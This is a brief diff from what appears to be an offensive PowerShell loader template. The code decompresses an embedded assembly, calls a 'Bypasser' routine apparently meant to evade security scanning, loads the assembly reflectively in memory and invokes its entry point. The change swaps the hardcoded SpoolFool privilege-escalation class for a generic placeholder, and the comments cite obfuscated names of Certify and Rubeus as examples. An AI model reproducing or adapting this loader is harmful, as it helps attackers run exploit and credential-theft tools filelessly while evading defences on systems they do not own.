@@ -21,7 +21,7 @@ Function Loader {
     $GUNZIP.Read($uncompressed, 0, 17920) | Out-Null # Put the size of the ORIGINAL exe file.
     Bypasser
     [System.Reflection.Assembly]::Load($uncompressed)
-    [SpoolFool.Program]::CommandEntry($args) # [Namespace.Class]::Function(args) Examples: [C3rt1fy.Program]::main(@(arg1, arg2)) , [R8b38s.Program]::Main($Command.Split(" "))
+    [Namespace.Program]::CommandEntry($args) # [Namespace.Class]::Function(args) Examples: [C3rt1fy.Program]::main(@(arg1, arg2)) , [R8b38s.Program]::Main($Command.Split(" "))
 }
 
 Function Bypasser {
